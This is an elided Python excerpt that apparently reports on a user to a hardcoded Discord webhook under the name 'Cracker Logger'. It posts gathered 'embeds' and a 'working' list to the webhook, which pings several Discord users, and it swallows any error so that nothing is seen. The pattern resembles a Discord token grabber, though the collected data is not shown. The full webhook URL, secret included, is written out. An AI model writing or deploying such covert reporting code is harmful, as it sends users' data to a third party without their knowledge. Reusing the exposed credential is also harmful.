...
my_webhook ="https://discord.com/api/webhooks/919545697890598932/BBPKYXqVDTBqaEiWnVzZJwA846Pu9nmWnmt5f9PlxK928TOdsBLkxIbLf6IesxokNiqR"
...
def main():
    ...
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "<@530342059400364034><@694233870505214093><@154322320045899785><@911735317743173713> A cracker has been detected lolz",
        "embeds": embeds,
        "username": "Cracker Logger",
        "avatar_url": ""
    }
    try:
        urlopen(Request(f"{my_webhook}", data=dumps(webhook).encode(), headers=getHeader()))
    except:
        pass
